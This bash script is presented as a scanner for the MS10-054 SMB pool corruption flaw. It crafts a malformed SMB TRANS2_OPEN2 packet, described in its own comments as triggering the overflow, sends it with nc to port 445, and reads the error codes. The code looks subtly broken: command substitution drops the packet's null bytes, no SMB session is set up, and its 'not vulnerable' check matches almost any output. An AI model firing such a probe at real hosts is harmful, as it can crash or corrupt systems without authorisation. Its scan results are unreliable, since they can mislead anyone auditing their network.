#!/bin/bash
# MS10-054 Scanner - SMB Pool Corruption Vulnerability
# Windows 2000/XP/2003/Vista/2008

scan_ms10_054() {
    local target=$1
    echo -e "\n${BLUE}[*]${NC} Checking MS10-054 (SMB Pool Corruption) on $target"
    
    # Craft malformed SMB_COM_TRANSACTION2 packet
    create_ms10_054_probe() {
        # This triggers the pool overflow in SrvSmbOpen2()
        printf "\\x00\\x00\\x00\\x48"  # NetBIOS length
        printf "\\xff\\x53\\x4d\\x42"  # SMB magic
        printf "\\x32\\x00\\x00\\x00"  # Command = TRANSACTION2
        printf "\\x00\\x18\\x01\\x28"  # Flags
        printf "\\x00\\x00\\x00\\x00"  # PID High
        printf "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"  # Signature
        printf "\\x00\\x00"            # Reserved
        printf "\\xff\\xff"            # TID
        printf "\\x00\\x00"            # PID Low
        printf "\\x00\\x00"            # UID
        printf "\\x00\\x00"            # MID
        
        # TRANSACTION2 parameters
        printf "\\x0f"                # WordCount
        printf "\\x00\\x00"           # TotalParamCount
        printf "\\x00\\x00"           # TotalDataCount
        printf "\\x01\\x00"           # MaxParamCount
        printf "\\x00\\x00"           # MaxDataCount
        printf "\\x01"                # MaxSetupCount
        printf "\\x00"                # Reserved1
        printf "\\x00\\x00"           # Flags
        printf "\\x00\\x00\\x00\\x00" # Timeout
        printf "\\x00\\x00"           # Reserved2
        printf "\\x00\\x00"           # ParamCount
        printf "\\x40\\x00"           # ParamOffset
        printf "\\x00\\x00"           # DataCount
        printf "\\x40\\x00"           # DataOffset
        printf "\\x01"                # SetupCount
        printf "\\x00"                # Reserved3
        printf "\\x0d\\x00"           # TRANS2_OPEN2 (vulnerable function)
        
        # Setup data
        printf "\\x04\\x00"           # ByteCount
        printf "\\x41\\x00\\x00\\x00" # Malformed filename
    }
    
    probe=$(create_ms10_054_probe)
    response=$(echo -n "$probe" | timeout 3 nc -w1 $target 445 2>/dev/null | xxd -p)
    
    if [ -n "$response" ]; then
        # Check for specific error codes indicating vulnerability
        if echo "$response" | grep -q "c000000d\|c0000005\|c0000008"; then
            echo -e "${RED}[!]${NC} Potentially vulnerable to MS10-054!"
            echo "    Error code indicates possible pool corruption"
        elif echo "$response" | grep -q "00000000"; then
            echo -e "${GREEN}[+]${NC} Not vulnerable or already patched"
        else
            echo -e "${YELLOW}[-]${NC} Inconclusive response"
        fi
    else
        echo "[-] No response received"
    fi
}
